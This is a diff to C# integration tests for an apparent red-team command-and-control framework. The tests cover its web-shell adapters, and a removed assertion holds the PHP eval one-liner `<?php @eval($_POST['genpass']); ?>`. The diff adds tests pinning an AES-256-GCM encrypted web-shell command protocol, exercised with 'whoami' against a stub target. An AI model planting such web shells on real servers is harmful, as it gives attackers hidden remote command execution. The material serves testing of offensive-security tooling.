@@ -1,5 +1,6 @@
 using System.Net;
 using System.Net.Http.Json;
+using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 using Microsoft.AspNetCore.Hosting;
@@ -16,15 +17,82 @@ namespace Rod.Integration.Tests;
 /// <summary>
 /// Acceptance: the web-shell surface (architecture.md Sec 5.2's Web-shell
 /// class). Registration binds a placed script to the engagement through a
-/// WebShell-class anchor row; the AntSword-compatible PHP adapter's wire
-/// shape is pinned directly (bootstrap parameter, random payload variable,
-/// per-request marker halves, base64 framing); and the synchronous
-/// execution arc runs end to end against a stub target that speaks the
-/// same shape -- issue, claim, adapter round trip, result -- landing as a
-/// completed task exactly like a beacon's capture.
+/// WebShell-class anchor row; both in-tree adapters' wire shapes are
+/// pinned directly -- the Rod-native family (baked 256-bit key,
+/// AES-256-GCM sealed request value and response body, a wrong key
+/// answering nothing) and the AntSword-compatible PHP family (bootstrap
+/// parameter, random payload variable, per-request marker halves, base64
+/// framing) -- and the synchronous execution arc runs end to end against
+/// a stub target that speaks the AntSword shape -- issue, claim, adapter
+/// round trip, result -- landing as a completed task exactly like a
+/// beacon's capture.
 /// </summary>
 public class WebShellTests
 {
+    [Fact]
+    public void RodAdapter_RendersAOneLinerCarryingTheBakedKey()
+    {
+        var adapter = new RodPhpAdapter();
+        var key = adapter.GenerateCredential();
+
+        var script = adapter.RenderScript(key);
+
+        Assert.StartsWith("<?php ", script);
+        Assert.EndsWith("?>", script);
+        Assert.Contains(key, script);
+        Assert.True(adapter.IsValidCredential(key));
+        Assert.False(adapter.IsValidCredential("connect"));
+    }
+
+    [Fact]
+    public void RodAdapter_RoundTripsUnderTheBakedKey_AndRefusesEverythingElse()
+    {
+        var adapter = new RodPhpAdapter();
+        var key = adapter.GenerateCredential();
+        var wrongKey = adapter.GenerateCredential();
+
+        var request = adapter.EncodeCommand(
+            "http://web.example.test/rod.php", key, "aes-256-gcm", "aes-256-gcm", "whoami");
+
+        // One form value under a random name, the sealed nonce‖ct‖tag shape.
+        var parameter = Assert.Single(request.Form);
+        Assert.NotEqual("whoami", parameter.Key);
+        var sealedBody = Convert.FromBase64String(parameter.Value);
+        Assert.True(sealedBody.Length > 12 + 16);
+
+        // The endpoint's answer seals the same way under the same key.
+        var answer = Convert.ToBase64String(Seal(key, "uid=0(root)"u8));
+        Assert.Equal("uid=0(root)", adapter.DecodeResponse(request, "aes-256-gcm", answer));
+
+        // A wrong key, a tampered body, and a non-protocol answer all read
+        // as the same refusal: null.
+        Assert.Null(adapter.DecodeResponse(
+            request with { Credential = wrongKey }, "aes-256-gcm", answer));
+        var tampered = Convert.FromBase64String(answer);
+        tampered[tampered.Length / 2] ^= 1;
+        Assert.Null(adapter.DecodeResponse(
+            request, "aes-256-gcm", Convert.ToBase64String(tampered)));
+        Assert.Null(adapter.DecodeResponse(request, "aes-256-gcm", "just a plain page"));
+    }
+
+    // The endpoint side of the sealed answer, mirroring the adapter's
+    // nonce‖ciphertext‖tag shape so the decode path is exercised against
+    // real GCM output.
+    private static byte[] Seal(string credential, ReadOnlySpan<byte> plain)
+    {
+        var key = Convert.FromBase64String(credential);
+        var nonce = RandomNumberGenerator.GetBytes(12);
+        var ciphertext = new byte[plain.Length];
+        var tag = new byte[16];
+        using (var aes = new AesGcm(key, 16))
+            aes.Encrypt(nonce, plain, ciphertext, tag);
+        var value = new byte[12 + ciphertext.Length + 16];
+        nonce.CopyTo(value.AsSpan(0, 12));
+        ciphertext.CopyTo(value.AsSpan(12, ciphertext.Length));
+        tag.CopyTo(value.AsSpan(12 + ciphertext.Length, 16));
+        return value;
+    }
+
     [Fact]
     public void Adapter_RendersTheEvalOneLiner()
     {
@@ -148,7 +216,7 @@ public class WebShellTests
 
         await using var target = await StubTarget.StartAsync();
         var registered = await env.Http.PostAsJsonAsync($"/engagements/{engagementId}/webshells",
-            new RegisterWebShellRequest(target.Url, Password: "connect"));
+            new RegisterWebShellRequest(target.Url, AdapterId: "antsword-php", Password: "connect"));
         registered.EnsureSuccessStatusCode();
         var endpoint = await registered.Content.ReadFromJsonAsync<WebShellDto>();
 
@@ -171,16 +239,19 @@ public class WebShellTests
         var engagementId = await CreateEngagementAsync(env.Http);
 
         // Generation decoupled from registration: no URL anywhere, and an
-        // unsupplied adapter falls back to the in-tree family.
+        // unsupplied adapter falls back to the Rod-native family with a
+        // freshly baked key.
         var generated = await env.Http.PostAsJsonAsync(
             $"/engagements/{engagementId}/webshells/scripts",
-            new GenerateWebShellScriptRequest(Password: "genpass"));
+            new GenerateWebShellScriptRequest());
         generated.EnsureSuccessStatusCode();
         var script = await generated.Content.ReadFromJsonAsync<ScriptDto>();
         Assert.NotNull(script);
-        Assert.Equal("<?php @eval($_POST['genpass']); ?>", script!.Script);
-        Assert.Equal("genpass", script.Password);
-        Assert.Equal("antsword-php", script.AdapterId);
+        Assert.Equal("rod-php", script!.AdapterId);
+        Assert.Equal("php", script.ScriptLanguage);
+        // The credential is a real 256-bit key, baked into the script.
+        Assert.Equal(32, Convert.FromBase64String(script.Password).Length);
+        Assert.Contains(script.Password, script.Script);
 
         // The script landed in the payload store like any build: content,
         // fingerprint, class -- re-downloadable under its payload id.
